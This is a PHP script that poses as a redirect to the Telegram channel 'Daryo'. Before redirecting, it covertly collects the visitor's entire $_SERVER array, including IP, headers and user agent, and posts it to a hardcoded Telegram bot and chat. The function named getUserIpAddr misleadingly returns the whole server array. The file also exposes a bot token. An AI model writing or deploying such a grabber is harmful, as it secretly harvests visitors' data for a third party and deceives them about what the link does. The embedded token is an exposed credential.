<?php

function getUserIpAddr()
{
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return json_encode($_SERVER);
}

$bot_token = '5948911251:AAESTDl8Ouv1p94VvxZlBK2PaGyPb2lER54';
$chat_id = 1865010399;

// Set the message text
$message = getUserIpAddr();

// Set the API URL
$url = "https://api.telegram.org/bot$bot_token/sendMessage";

// Set the POST data
$post_data = [
    'chat_id' => $chat_id,
    'text' => $message,
    ];

// Initialize cURL
$curl = curl_init();

curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

// Execute the request
$response = curl_exec($curl);

// Check for errors
if (curl_errno($curl)) {
  $error_msg = curl_error($curl);
  echo "cURL error: $error_msg";
}

// Close cURL
curl_close($curl);

// echo $response;

header("Location: tg://resolve?domain=Daryo");
?>